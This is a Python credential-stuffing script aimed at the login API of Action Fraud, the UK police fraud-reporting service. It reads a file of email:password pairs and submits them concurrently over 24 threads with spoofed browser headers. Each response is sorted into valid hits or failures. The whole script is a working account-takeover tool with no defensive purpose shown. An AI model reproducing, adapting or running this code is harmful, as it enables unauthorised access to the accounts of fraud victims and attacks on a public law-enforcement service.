import requests
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool

filename = input("Filename > ")
f = open(filename)
lines = f.readlines()

r1 = requests.get("https://actionfraud.police.uk")
print(r1.cookies)

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/json',
    'Timezone': '+0000',
    'Origin': 'https://reporting.actionfraud.police.uk',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Referer': 'reporting.actionfraud.police.uk',
}


def check(line):
    line = line.strip('\n')
    line2 = line.split(":")
    email = line2[0]
    password = line2[1]
    data = {
        'email':email,
        'password':password
    }
    response = requests.post('https://api.actionfraud.police.uk/v01/user/auth/', headers=headers, cookies=r1.cookies, json=data)
    if "Invalid user credentials" in response.text:
        print("[BAD] " + line)
    elif "access_token" in response.text:
        print("[HIT] " + line)
    else:
        print(response.text)

pool = ThreadPool(24)
results = pool.map(check, lines)
